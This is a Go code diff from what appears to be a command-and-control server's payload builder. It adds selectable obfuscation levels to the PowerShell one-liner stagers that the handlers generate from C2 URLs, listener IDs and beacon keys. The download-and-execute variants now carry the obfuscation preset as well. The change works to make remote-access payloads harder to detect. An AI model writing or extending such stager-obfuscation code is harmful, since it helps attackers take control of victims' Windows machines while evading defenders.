@@ -42,6 +42,9 @@ func (s *Server) handleGeneratePS1(c *gin.Context) {
 		Proxy         string `form:"proxy"`
 		CryptoKey     string `form:"crypto_key"`
 		BeaconKey     string `form:"beacon_key"`
+		// Obfuscation selects the PowerShell one-liner preset:
+		// ""/none (legacy), light, standard, heavy. Empty = legacy.
+		Obfuscation string `form:"obfuscation"`
 	}
 	if err := c.ShouldBind(&form); err != nil {
 		respondError(c, http.StatusBadRequest, "Invalid request parameters")
@@ -105,7 +108,7 @@ func (s *Server) handleGeneratePS1(c *gin.Context) {
 		return
 	}
 
-	oneLiner := obfuscation.GenerateCommandLineOneLiner(ps1Code)
+	oneLiner := obfuscation.GenerateCommandLineOneLinerWithOptions(ps1Code, obfuscation.PresetForLevel(form.Obfuscation))
 
 	s.logBuild("windows", "ps1", form.C2URL, form.ListenerID, form.Filename, "success", "", "")
 	c.JSON(http.StatusOK, gin.H{
@@ -113,6 +116,7 @@ func (s *Server) handleGeneratePS1(c *gin.Context) {
 		"code":            oneLiner,
 		"original_length": len(ps1Code),
 		"obfuscated_len":  len(oneLiner),
+		"obfuscation":     form.Obfuscation,
 	})
 }
 
@@ -139,6 +143,9 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 		P2PListenAddr   string `form:"p2p_listen_addr"`
 		DNSDomain       string `form:"dns_domain"`
 		DNSServer       string `form:"dns_server"`
+		// Obfuscation selects the PowerShell one-liner preset for the
+		// self-contained Base64 variant: ""/none (legacy), light, standard, heavy.
+		Obfuscation string `form:"obfuscation"`
 	}
 	if err := c.ShouldBind(&form); err != nil {
 		respondError(c, http.StatusBadRequest, "Invalid request parameters")
@@ -322,7 +329,7 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 	// Generate one-liner variants (verified variants carry the SHA-256 so the
 	// target validates the payload after download/resume, before executing).
 	payloadSHA, payloadSize := sha256OfFile(hostPath)
-	oneLiners := buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, form.Proxy, payloadSHA)
+	oneLiners := buildOneLinersWithObfuscation(payloadType, ps1Code, payloadURL, hostPath, form.Proxy, payloadSHA, obfuscation.PresetForLevel(form.Obfuscation))
 
 	// The original build artifact in data/agents is a duplicate of the hosted
 	// payload copy and is never served again — register it for reaping.
